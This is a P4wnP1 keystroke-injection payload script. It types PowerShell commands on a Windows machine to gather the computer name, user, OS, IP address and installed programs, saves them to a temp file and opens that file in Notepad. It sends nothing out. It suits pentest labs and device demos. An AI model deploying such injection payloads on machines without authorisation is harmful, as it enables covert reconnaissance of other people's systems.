// Windows Information Gathering Payload
// Collects system information and saves to a file
// Compatible with P4wnP1 A.L.O.A

layout('us'); // Set keyboard layout

// Wait for system to be ready
delay(3000);

// Open PowerShell as admin (requires UAC bypass or user acceptance)
press("GUI r");
delay(500);
type("powershell\n");
delay(2000);

// Collect system information
type("$info = @()\n");
delay(100);
type("$info += 'System Information Gathered:'\n");
delay(100);
type("$info += ''\n");
delay(100);
type("$info += 'Computer Name: ' + $env:COMPUTERNAME\n");
delay(100);
type("$info += 'Username: ' + $env:USERNAME\n");
delay(100);
type("$info += 'OS: ' + (Get-WmiObject -Class Win32_OperatingSystem).Caption\n");
delay(100);
type("$info += 'Architecture: ' + $env:PROCESSOR_ARCHITECTURE\n");
delay(100);
type("$info += 'IP Address: ' + (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike '*Loopback*'} | Select-Object -First 1).IPAddress\n");
delay(100);
type("$info += ''\n");
delay(100);
type("$info += 'Installed Programs:'\n");
delay(100);
type("$info += Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName | Format-Table -AutoSize | Out-String\n");
delay(100);

// Save to file
type("$info | Out-File -FilePath $env:TEMP\\sysinfo.txt\n");
delay(500);

// Open the file
type("notepad $env:TEMP\\sysinfo.txt\n");
delay(1000);

// Close PowerShell
type("exit\n");
